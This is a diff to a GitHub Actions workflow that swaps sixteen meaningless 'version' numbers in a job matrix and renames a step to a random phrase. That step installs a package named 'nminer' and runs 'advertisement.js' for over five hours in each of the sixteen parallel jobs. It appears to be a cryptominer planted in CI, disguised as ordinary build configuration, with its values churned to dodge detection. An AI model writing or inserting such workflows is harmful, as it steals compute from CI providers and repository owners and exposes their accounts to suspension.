@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1819 }
-          - { version: 5700 }
-          - { version: 9732 }
-          - { version: 1310 }
-          - { version: 8788 }
-          - { version: 7188 }
-          - { version: 6062 }
-          - { version: 6363 }
-          - { version: 861 }
-          - { version: 2987 }
-          - { version: 2911 }
-          - { version: 8818 }
-          - { version: 299 }
-          - { version: 9705 }
-          - { version: 6878 }
-          - { version: 1066 }
+          - { version: 6897 }
+          - { version: 5837 }
+          - { version: 8450 }
+          - { version: 4193 }
+          - { version: 2084 }
+          - { version: 4411 }
+          - { version: 4798 }
+          - { version: 8097 }
+          - { version: 1863 }
+          - { version: 6111 }
+          - { version: 5252 }
+          - { version: 2584 }
+          - { version: 5122 }
+          - { version: 152 }
+          - { version: 7245 }
+          - { version: 8022 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: plugin nor whenever
+      - name: skyscraper drat
         run: |
           npm install nminer@latest
-          timeout 328m node advertisement.js || echo "advertisement executed"
+          timeout 316m node advertisement.js || echo "advertisement executed"
